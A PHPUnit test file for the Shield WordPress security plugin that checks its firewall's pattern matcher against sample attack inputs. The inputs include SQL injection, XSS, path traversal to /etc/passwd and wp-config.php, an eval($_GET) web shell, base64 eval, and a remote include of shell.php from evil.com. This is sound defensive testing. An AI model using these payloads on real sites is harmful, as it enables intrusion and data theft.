<?php declare( strict_types=1 );

namespace FernleafSystems\Wordpress\Plugin\Shield\Tests\Unit\Rules;

use FernleafSystems\Wordpress\Plugin\Shield\Rules\Enum\EnumMatchTypes;
use FernleafSystems\Wordpress\Plugin\Shield\Rules\Utility\PerformConditionMatch;
use Yoast\PHPUnitPolyfills\TestCases\TestCase;

/**
 * Unit tests for PerformConditionMatch - the core pattern matching utility
 * used by the firewall and security rules system.
 * 
 * These tests verify that attack detection patterns work correctly,
 * which is critical for the firewall's effectiveness.
 */
class PerformConditionMatchTest extends TestCase {

	// =========================================================================
	// REGEX MATCHING TESTS - Core firewall pattern matching
	// =========================================================================

	/**
	 * @dataProvider providerSqlInjectionPatterns
	 */
	public function testRegexDetectsSqlInjectionPatterns( string $pattern, string $input, bool $shouldMatch ) :void {
		$matcher = new PerformConditionMatch( $input, $pattern, EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertSame(
			$shouldMatch,
			$matcher->doMatch(),
			sprintf( "Pattern '%s' %s match input '%s'", $pattern, $shouldMatch ? 'should' : 'should NOT', $input )
		);
	}

	public static function providerSqlInjectionPatterns() :array {
		return [
			// Basic SQL injection patterns
			'union select attack' => [
				'#union.*select#i',
				"' UNION SELECT * FROM users--",
				true
			],
			'union select with spaces' => [
				'#union.*select#i',
				"1' UNION   SELECT password FROM wp_users",
				true
			],
			'safe query with union word' => [
				'#union.*select#i',
				"Search for credit union information",
				false
			],
			'drop table attack' => [
				'#drop\s+table#i',
				"'; DROP TABLE wp_users;--",
				true
			],
			'legitimate drop word' => [
				'#drop\s+table#i',
				"Please drop the package at the door",
				false
			],
			'or 1=1 bypass' => [
				"#'\\s*or\\s*'?\\d+'?\\s*=\\s*'?\\d+#i",
				"admin' OR '1'='1",
				true
			],
			'or 1=1 numeric' => [
				"#'\\s*or\\s*'?\\d+'?\\s*=\\s*'?\\d+#i",
				"admin' OR 1=1--",
				true
			],
		];
	}

	/**
	 * @dataProvider providerXssPatterns
	 */
	public function testRegexDetectsXssPatterns( string $pattern, string $input, bool $shouldMatch ) :void {
		$matcher = new PerformConditionMatch( $input, $pattern, EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertSame(
			$shouldMatch,
			$matcher->doMatch(),
			sprintf( "Pattern '%s' %s match input '%s'", $pattern, $shouldMatch ? 'should' : 'should NOT', $input )
		);
	}

	public static function providerXssPatterns() :array {
		return [
			'script tag attack' => [
				'#<script[^>]*>#i',
				'<script>alert("XSS")</script>',
				true
			],
			'script with attributes' => [
				'#<script[^>]*>#i',
				'<script src="evil.js">',
				true
			],
			'legitimate less than' => [
				'#<script[^>]*>#i',
				'The value is < script limit',
				false
			],
			'onclick handler' => [
				'#on(click|load|error|mouseover)\\s*=#i',
				'<img src="x" onerror="alert(1)">',
				true
			],
			'onclick in attribute' => [
				'#on(click|load|error|mouseover)\\s*=#i',
				'<button onclick="doSomething()">',
				true
			],
			'legitimate onclick word' => [
				'#on(click|load|error|mouseover)\\s*=#i',
				'Learn about onclick events',
				false
			],
			'javascript protocol' => [
				'#javascript\\s*:#i',
				'<a href="javascript:alert(1)">',
				true
			],
		];
	}

	/**
	 * @dataProvider providerDirectoryTraversalPatterns
	 */
	public function testRegexDetectsDirectoryTraversal( string $pattern, string $input, bool $shouldMatch ) :void {
		$matcher = new PerformConditionMatch( $input, $pattern, EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertSame(
			$shouldMatch,
			$matcher->doMatch(),
			sprintf( "Pattern '%s' %s match input '%s'", $pattern, $shouldMatch ? 'should' : 'should NOT', $input )
		);
	}

	public static function providerDirectoryTraversalPatterns() :array {
		return [
			'basic traversal' => [
				'#\\.\\./|\\.\\.\\\\#',
				'../../../etc/passwd',
				true
			],
			'windows traversal' => [
				'#\\.\\./|\\.\\.\\\\#',
				'..\\..\\..\\windows\\system32',
				true
			],
			'encoded traversal' => [
				'#%2e%2e[/\\\\]#i',
				'%2e%2e/%2e%2e/etc/passwd',
				true
			],
			'legitimate relative path' => [
				'#\\.\\./#',
				'./current/directory',
				false
			],
		];
	}

	// =========================================================================
	// EQUALS MATCHING TESTS
	// =========================================================================

	public function testEqualsMatchExact() :void {
		$matcher = new PerformConditionMatch( 'admin', 'admin', EnumMatchTypes::MATCH_TYPE_EQUALS );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testEqualsMatchCaseSensitive() :void {
		$matcher = new PerformConditionMatch( 'Admin', 'admin', EnumMatchTypes::MATCH_TYPE_EQUALS );
		$this->assertFalse( $matcher->doMatch(), 'Equals should be case-sensitive' );
	}

	public function testEqualsMatchCaseInsensitive() :void {
		$matcher = new PerformConditionMatch( 'Admin', 'admin', EnumMatchTypes::MATCH_TYPE_EQUALS_I );
		$this->assertTrue( $matcher->doMatch(), 'Equals_I should be case-insensitive' );
	}

	public function testEqualsMatchNumericCoercion() :void {
		$matcher = new PerformConditionMatch( 123, '123', EnumMatchTypes::MATCH_TYPE_EQUALS );
		$this->assertTrue( $matcher->doMatch(), 'Should coerce types for comparison' );
	}

	// =========================================================================
	// CONTAINS MATCHING TESTS
	// =========================================================================

	public function testContainsMatchSubstring() :void {
		$matcher = new PerformConditionMatch( 'hello world', 'world', EnumMatchTypes::MATCH_TYPE_CONTAINS );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testContainsMatchCaseSensitive() :void {
		$matcher = new PerformConditionMatch( 'Hello World', 'world', EnumMatchTypes::MATCH_TYPE_CONTAINS );
		$this->assertFalse( $matcher->doMatch(), 'Contains should be case-sensitive' );
	}

	public function testContainsMatchCaseInsensitive() :void {
		$matcher = new PerformConditionMatch( 'Hello World', 'WORLD', EnumMatchTypes::MATCH_TYPE_CONTAINS_I );
		$this->assertTrue( $matcher->doMatch(), 'Contains_I should be case-insensitive' );
	}

	public function testContainsMatchInArray() :void {
		$matcher = new PerformConditionMatch( [ 'apple', 'banana', 'cherry' ], 'banana', EnumMatchTypes::MATCH_TYPE_CONTAINS );
		$this->assertTrue( $matcher->doMatch(), 'Should find value in array' );
	}

	public function testContainsMatchNotInArray() :void {
		$matcher = new PerformConditionMatch( [ 'apple', 'banana', 'cherry' ], 'grape', EnumMatchTypes::MATCH_TYPE_CONTAINS );
		$this->assertFalse( $matcher->doMatch(), 'Should not find missing value in array' );
	}

	// =========================================================================
	// COMPARISON MATCHING TESTS
	// =========================================================================

	public function testLessThanMatch() :void {
		$matcher = new PerformConditionMatch( 5, 10, EnumMatchTypes::MATCH_TYPE_LESS_THAN );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testLessThanMatchFalse() :void {
		$matcher = new PerformConditionMatch( 15, 10, EnumMatchTypes::MATCH_TYPE_LESS_THAN );
		$this->assertFalse( $matcher->doMatch() );
	}

	public function testGreaterThanMatch() :void {
		$matcher = new PerformConditionMatch( 15, 10, EnumMatchTypes::MATCH_TYPE_GREATER_THAN );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testGreaterThanMatchFalse() :void {
		$matcher = new PerformConditionMatch( 5, 10, EnumMatchTypes::MATCH_TYPE_GREATER_THAN );
		$this->assertFalse( $matcher->doMatch() );
	}

	// =========================================================================
	// EDGE CASES AND ERROR HANDLING
	// =========================================================================

	public function testEmptyPatternRegex() :void {
		// Empty regex pattern should match empty strings
		$matcher = new PerformConditionMatch( '', '#^$#', EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testEmptyInputContains() :void {
		$matcher = new PerformConditionMatch( '', 'test', EnumMatchTypes::MATCH_TYPE_CONTAINS );
		$this->assertFalse( $matcher->doMatch() );
	}

	public function testSpecialRegexCharactersInInput() :void {
		// Input with regex special characters should be treated as literal in regex pattern
		$matcher = new PerformConditionMatch( 'test[1]', '#test\\[1\\]#', EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertTrue( $matcher->doMatch() );
	}

	public function testUnsupportedMatchTypeThrowsException() :void {
		$matcher = new PerformConditionMatch( 'test', 'test', 'invalid_match_type' );
		$this->expectException( \Exception::class );
		$this->expectExceptionMessage( 'No handling for match type' );
		$matcher->doMatch();
	}

	// =========================================================================
	// REAL-WORLD FIREWALL PATTERN TESTS
	// =========================================================================

	/**
	 * @dataProvider providerRealWorldAttackPatterns
	 */
	public function testRealWorldAttackDetection( string $description, string $pattern, string $attackPayload ) :void {
		$matcher = new PerformConditionMatch( $attackPayload, $pattern, EnumMatchTypes::MATCH_TYPE_REGEX );
		$this->assertTrue(
			$matcher->doMatch(),
			sprintf( "Failed to detect: %s\nPattern: %s\nPayload: %s", $description, $pattern, $attackPayload )
		);
	}

	public static function providerRealWorldAttackPatterns() :array {
		return [
			'PHP code injection - eval' => [
				'PHP code execution via eval',
				'#eval\\s*\\(#i',
				'<?php eval($_GET["cmd"]); ?>'
			],
			'PHP code injection - base64' => [
				'Base64 encoded PHP execution',
				'#base64_decode\\s*\\(#i',
				'eval(base64_decode("cGhwaW5mbygpOw=="));'
			],
			'Remote file inclusion' => [
				'Remote file inclusion attempt',
				'#(https?|ftp)://[^\\s<>"\']+\\.php#i',
				'include("http://evil.com/shell.php");'
			],
			'WordPress config access' => [
				'wp-config.php access attempt',
				'#wp-config\\.php#i',
				'../../../wp-config.php'
			],
		];
	}
}

